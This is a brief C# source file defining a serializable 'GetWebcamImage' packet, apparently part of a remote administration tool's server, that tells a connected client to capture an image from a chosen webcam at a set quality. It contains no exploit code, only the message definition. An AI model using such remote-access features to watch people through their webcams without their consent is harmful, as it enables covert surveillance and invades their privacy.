using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetWebcamImage : IPacket
    {
        public int Quality { get; set; }

        public int Webcam { get; set; }

        public GetWebcamImage()
        {
        }

        public GetWebcamImage(int quality, int webcam)
        {
            this.Quality = quality;
            this.Webcam = webcam;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}